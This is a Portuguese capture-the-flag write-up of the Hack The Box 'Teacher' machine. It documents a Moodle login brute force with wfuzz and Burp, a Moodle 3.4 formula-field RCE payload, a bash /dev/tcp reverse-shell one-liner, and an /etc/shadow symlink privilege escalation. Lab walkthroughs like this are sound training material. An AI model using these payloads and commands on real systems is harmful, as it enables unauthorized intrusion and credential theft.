---
title: "Hack The Box - Teacher"
tags: [Linux,Easy,Web,Wffuz,Brute Force,BurpSuite,Pspy]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/165>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 1 porta aberta

> Porta 80 -> Servidor Web

## Enumeração da porta 80

Abrindo a página verificamos o que tem nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_web.png)

Como de costume, sempre é bom termos rodando algum tipo de enumeração enquanto verificamos outras portas e serviços, pensando nisso vou deixar rodando um `Wfuzz` na porta 80 pra descobrir diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_wfuzz.png)

Explicação Wfuzz:
> -c --> Exibir com cores

> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --> indicamos que o método será dicionário e o arquivo especificado

> --hc 404 --> Não vai exibir os arquivos que deram erro 404.

> -t 200 --> Quantidade de threads (pra ir mais rápido)

## Verificamos o código fonte da página na galeria, muito sutil, mas de grande valia, verificamos que a imagem 5 foge o padrão das outras imagens

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_fonte.png)

Tentamos abrir e vemos que está muito estranho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_img-.png)

### Baixamos essa "imagem" pra nossa máquina com o wget e quando verificamos que tipo de "imagem" é, temos a surpresa de ser texto

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_wget.png)

Nota: outro método para descobrir essa "imagem" é através do diretório /images direto, pois verificamos que o item 5 tem tamanho diferente das demais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_imagem.png)

### Certo, temos um login e um possível pedaço de senha, só está faltando o último caractere pelo que está escrito.

### Entramos na página `/moodle` e verificamos que há campo para login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_moodle.png)

#### Possivelmente o login é Giovanni, pois está na página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_moodle1.png)

# Exploração

## Aqui vamos fazer de dois modos. Pelo Wfuzz e pelo BurpSuite

#### 1º Modo - através do wfuzz vamos realizar o brute force pra descobrir qual a senha

Primeiro devemos jogar essa requisição de login pro BurpSuite pra pegarmos como ela está estruturada pro wfuzz poder fazer o trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_burp.png)

Utilizamos uma wordlist de caracteres especiais pois grande parte das senhas possuem o último caractere como sendo um special char, como por exemplo #$%!&... Também retiramos o "." que havia no final da senha, pois suspeitamos que seja somente um marcador de final de frase, não fazendo parte da senha.

> wfuzz -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt --hh 440

> -u --> Link onde está a página de login

> -d --> Como está estruturada a requisição do login

> -w --> Wordlist, no caso eu usei uma da seclist que tem somente special chars

> --hh 400 --> Ele vai esconder, não vai mostrar as requisição que derem como tamanho 400, eu sei pois testei com uma senha errada, e o retorno foi esse valor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_wfuzz-brute.png)

Nota: a wordlist utilizada faz parte da Seclists, lá tem muita wordlist boa, vale a pena perder um tempinho olhando, vai te poupar muito tempo no futuro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_seclist.png)

##### Pronto, descobrimos a senha: `Th4C00lTheacha#`

#### 2º Modo - através do BurpSuite, é um pouco mais braçal e chato de se fazer, mas é interessante pra aprendermos melhor como usar o Burp, que por sinal é uma ferramenta espetacular

Primeiro devemos jogar a requisição pro Burp, do mesmo modo que foi feito com o wfuzz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_burp.png)

Agora devemos jogar para o `Intruder`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_burp-intruder.png)

Criamos a wordlist que será utilizada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_wordlist.png)

Na aba *Payloads* devemos configurar dessa maneira

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_burp-pay.png)

Iniciamos o ataque clicando em *Start Attack*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_burp-attack.png)

Verificamos o `Th4C00lTheacha#` possue um tamanho diferente dos demais, possivelmente esse é a senha correta

### Agora vamos tentar logar com a senha encontrada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_log.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_log1.png)

Show de bola, conseguimos logar na aplicação, agora vamos tentar procurar maneiras de conseguir um RCE.

Procurando por exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_searchsploit.png)

Muitos encontrados, mas é difícil dizer qual irá funcionar

#### Primeiro passo sempre é tentar descobrir qual a versão da aplicação que está rodando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_enum.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_enum1.png)

#### Procuramos por `Moodle Docs for this page`, após mexer nas abas encontramos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_docs.png)

A versão de 3.4, uma vez que ali esta *34*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_docs1.png)

Bom, já diminuiu e muito o escopo de exploits que podemos utilizar pra somente 1... É, bem melhor que antes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_searchsploit1.png)

> Procurando na internet maneiras de explorar essa vulnerabilidade acabamos encontrando esse link e será por ele que eu me guiarei para realizar a exploração manual

> https://blog.ripstech.com/2018/moodle-remote-code-execution/

### Explando a vulnerabilidade

A vulnerabilidade consiste em criarmos um *Quiz* e dentro de um desses campos está vulnerável a RCE

Primeiro passo é clicar em *Turn Edit On* para podermos editar coisas, e assim criar um Quiz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp.png)

Irá ficar desse modo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp1.png)

Agora o segundo passo é clicar em *Add an activity or resource* e selecioar *Quiz*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp2.png)

Terceiro passo é realizar o preenchimento normal das informações requisitadas, Nome do Quiz e Descrição e clicar em *Save and Display*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp4.png)

Quarto passo é clicar em *Edit* e na próxima tela em *Add* e após isso em *+ a new question* e selecionar *Calculated*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp6.png)

É nesse ponto em que encontramos o campo *Formula* que está vulnerável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp7.png)

Agora retornando ao blog que foi descrito acima como base para realizar a exploração, lendo mais a fundo ele descobrimos como realizar essa exploração desse campo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp8.png)

Iremos utilizar o Nº 4 */*{a*/`$_GET[0]`;//{x}}*
Modificamos de $_GET para $_REQUEST pois fica melhor de trabalhar com o Burp
Mudamos também o *0* para *cmd*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp11.png)

Agora apertamos F5 e jogamos para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp12.png)

Agora jogamos para o *Repeater*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp13.png)

Agora testamos o RCE, fazendo um Ping para nossa máquina Kali e vimos que deu certo. Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp14.png)

Pegamos um shell reverso agora

> bash -c 'bash -i >& /dev/tcp/10.10.16.119/443 0>&1'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_exp15.png)

# Escalando privilégio

#### Uma das primeiras atividades na máquina é procurar por arquivos de configuração que possivelmente pode conter conter credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell.png)

> $CFG->dbuser    = 'root';
> $CFG->dbpass    = 'Welkom1!';

Realizamos login no mysql com essas credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell1.png)

Listamos as databases e entramos na database moodle

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell2.png)

Listamos as tables da database moodle e encontramos uma table que nos chamou atenção, table user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell4.png)

Com o describe verificamos o que tem nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell6.png)

Selecionamos id, username e password

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell5.png)

No google descobrimos que esse hash é *expelled*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shell5.png)

Tentamos logar como usuário Giovanni na máquina com essa senha descoberta e conseguimos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_gio.png)

### Escalando para root

Não vou rodar o LinEnum nem o Linpeas por que não conseguiremos nada por ai

Verificamos que tem algo estranho sendo executado possivelmente um cronjob pq tem arquivos de root na pasta do giovanni, contudo não tem nada no /etc/cron*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_find.png)

#### Rodando o pspy64s

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_pspy.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_pspy1.png)

Após executar ele verificamos que tem um cronjob sim, sendo executado como root, e ele dá alguns comandos e executa o *backup.sh*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_pspy2.png)

#### Verificando o que o backup.sh faz

No pau da goiaba ele faz um chmod 777 na pasta /tmp na diretório home do Giovanni
Bom, se ele faz isso, interessante, podemos criar um link simbolico para o /etc/shadow por exemplo, ele vai atribuir 777 no /etc/shadow e ai é só sucesso...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_backup.png)

Verificando permissões do /etc/shadow antes de realizar o show

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shadow.png)

Criando o link simbolico para /etc/shadow

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shadow1.png)

Verificamos permissões do /etc/shadow depois do cronjob rodar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shadow2.png)

#### Show de bola, agora é só correr pro abraço

##### Modificamos a senha do root pra ser igual a do Giovanni, uma vez que já possuimos a senha dele

Antes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shadow3.png)

Depois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_shadow4.png)

## Logamos como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_logroot.png)

### Pegamos flag de root e user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-teacher/Teacher_user.png)

Nota: logicamente nessa máquina teríamos infinitas possibilidades de escalar privilégio, poderiamos editar o shadow, pegar a flag de root direto, colocar o diretório do /root como 777 e pegar as chaves ssh... enfim, diversas, fica a seu critério qual utilizar.